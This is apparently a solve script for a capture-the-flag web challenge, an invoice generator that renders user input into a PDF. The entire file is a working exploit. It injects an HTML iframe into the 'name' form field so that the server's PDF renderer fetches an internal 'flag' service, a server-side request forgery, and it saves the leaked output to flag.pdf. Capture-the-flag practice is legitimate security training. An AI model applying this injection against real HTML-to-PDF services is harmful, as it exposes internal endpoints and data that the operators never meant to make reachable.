import requests

url = "https://lactf-invoice-generator-kmd9b.instancer.lac.tf/"

payload = '<iframe src="http://flag:8081/flag"></iframe>'

res = requests.post(f'{url}/generate-invoice', data={
    'name': payload,
    'item': 'hacked',
    'cost': '1337',
    'datePurchased': '1337' 
})

with open("flag.pdf", "wb") as f:
    f.write(res.content)